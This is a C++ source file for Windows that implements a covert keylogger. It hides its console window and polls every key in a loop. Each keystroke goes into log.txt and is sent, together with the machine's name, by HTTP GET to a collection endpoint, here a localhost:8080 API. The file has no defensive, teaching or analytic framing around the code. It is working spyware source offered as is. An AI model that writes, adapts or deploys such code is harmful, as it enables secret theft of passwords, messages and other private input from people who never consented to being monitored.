#include <stdio.h>
#include <iostream>
#include "Windows.h"
#include <string>
#include "curl/curl.h"

using namespace std;

int save(int _key, char *file);
int serverFeed(int _key, string host_name);



int main(void)
{
	//Deamon Running 
	 FreeConsole();


	TCHAR computerName[MAX_COMPUTERNAME_LENGTH + 1];
	DWORD size = sizeof(computerName) / sizeof(computerName[0]);
	GetComputerName(computerName, &size);

	wstring test(&computerName[0]); 
	string test2(test.begin(), test.end());

	char i;

	while (1) {

		Sleep(10);
		for (i = 8; i < 255; i++) {
			if (GetAsyncKeyState(i) == -32767) {
				save(i, "log.txt");
				serverFeed(i, test2);
			}
		}
	}
}

int save(int _key, char *file) {

	Sleep(10);


	FILE *OUTPUT_FILE;

	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_SHIFT) {
		fprintf(OUTPUT_FILE, "%s", "[SHIFT]");
	}
	else if (_key == VK_BACK) {
		fprintf(OUTPUT_FILE, "%s", "[BACK]");
	}
	else if (_key == VK_LBUTTON) {
		fprintf(OUTPUT_FILE, "%s", "[LBUTTON]");
	}
	else if (_key == VK_RETURN) {
		fprintf(OUTPUT_FILE, "%s", "[ENTER]");
	}
	else if (_key == VK_ESCAPE) {
		fprintf(OUTPUT_FILE, "%s", "[ESCAPE]");
	}
	else {
		fprintf(OUTPUT_FILE, "%s", &_key);
	}

	fclose(OUTPUT_FILE);

	return 0;
}

int serverFeed(int _key, string host_name) {

	CURL *curl;
	CURLcode res;

	//url to invoke - GET Request
	string url = "http://localhost:8080/api/ack?user=";
	url.append(host_name);
	url.append("&key=");
	url.append(to_string(_key));
	char *url_chrs = new char[url.length() + 1];
	strcpy(url_chrs, url.c_str());

	curl = curl_easy_init();
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, url_chrs);
		curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

		res = curl_easy_perform(curl);
		if (res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
				curl_easy_strerror(res));
		curl_easy_cleanup(curl);
	}

	delete[] url_chrs;
	return 0; 
}
